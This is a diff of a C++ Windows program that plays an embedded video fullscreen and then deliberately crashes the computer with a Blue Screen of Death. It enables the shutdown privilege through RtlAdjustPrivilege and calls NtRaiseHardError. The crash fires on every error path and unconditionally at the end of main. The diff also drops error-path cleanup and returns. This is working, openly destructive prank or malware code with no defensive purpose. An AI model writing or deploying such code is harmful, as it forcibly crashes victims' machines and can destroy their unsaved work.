@@ -12,44 +12,50 @@ std::unique_ptr<IMediaControl> control;
 std::unique_ptr<IMediaEvent> event;
 std::unique_ptr<IVideoWindow> window;
 
+// Function to trigger BSoD
+ULONG TriggerBSOD() {
+    BOOLEAN state;
+    ULONG response;
+
+    RtlAdjustPrivilege(19, TRUE, FALSE, &state); // Adjust privileges
+    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // Raise BSoD
+
+    return response;
+}
+
 // Function to get the video resource
 void GetVideoResource(LPWSTR* path) {
     // Get the video resource
     HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
+
     if (resource == NULL) {
-        // If resource not found, trigger BSoD
-        TriggerBSOD();
-        return;
+        TriggerBSOD(); // If resource not found, trigger BSoD
     }
 
     // Get resource data
     DWORD size = SizeofResource(NULL, resource);
     LPVOID data = LockResource(LoadResource(NULL, resource));
+
     if (data == NULL) {
-        // If resource data not retrieved, trigger BSoD
-        TriggerBSOD();
-        return;
+        TriggerBSOD(); // If resource data not retrieved, trigger BSoD
     }
 
     // Create temporary file path
     *path = new WCHAR[MAX_PATH];
+
     GetTempPathW(MAX_PATH, *path);
     StringCbCatW(*path, MAX_PATH, L"video.wmv");
 
     // Create and write to the temporary file
     HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD written;
+
     if (file == INVALID_HANDLE_VALUE) {
-        // If file creation failed, trigger BSoD
-        TriggerBSOD();
-        return;
+        TriggerBSOD(); // If file creation failed, trigger BSoD
     }
 
-    DWORD written;
     if (!WriteFile(file, data, size, &written, NULL) || written != size) {
-        // If write operation failed, close the file handle and trigger BSoD
-        CloseHandle(file);
-        TriggerBSOD();
-        return;
+        TriggerBSOD(); // If writing to file failed, trigger BSoD
     }
 
     // Close the file handle and free the resource
@@ -64,15 +70,15 @@ void InitializeDirectShow(LPCWSTR path) {
 
     // Create DirectShow objects
     graph.reset();
+
     CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
 
     control.reset();
-    graph->QueryInterface(IID_IMediaControl, (void**)&control);
-
     event.reset();
-    graph->QueryInterface(IID_IMediaEvent, (void**)&event);
-
     window.reset();
+
+    graph->QueryInterface(IID_IMediaControl, (void**)&control);
+    graph->QueryInterface(IID_IMediaEvent, (void**)&event);
     graph->QueryInterface(IID_IVideoWindow, (void**)&window);
 
     // Render the video file
@@ -82,30 +88,22 @@ void InitializeDirectShow(LPCWSTR path) {
     window->put_FullScreenMode(OATRUE);
 }
 
-// Function to trigger BSoD
-ULONG TriggerBSOD() {
-    BOOLEAN state;
-    ULONG response;
-    RtlAdjustPrivilege(19, TRUE, FALSE, &state); // Adjust privileges
-    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // Raise BSoD
-    return response;
-}
-
 int main() {
     LPWSTR path;
+
     GetVideoResource(&path); // Get the video resource
+    InitializeDirectShow(path); // Initialize DirectShow
 
     try {
-        InitializeDirectShow(path); // Initialize DirectShow
-        control->Run();             // Play the video
+        control->Run(); // Play the video
         event->WaitForCompletion(INFINITE, nullptr); // Wait for video to finish
     } catch (const std::exception& e) {
-        // If exception occurs, trigger BSoD
-        TriggerBSOD();
+        TriggerBSOD(); // If exception occurs, trigger BSoD
     }
 
     // Trigger BSoD after attempting to play the video
     TriggerBSOD();
 
+    // In case BSoD fails, return 1
     return 1;
 }
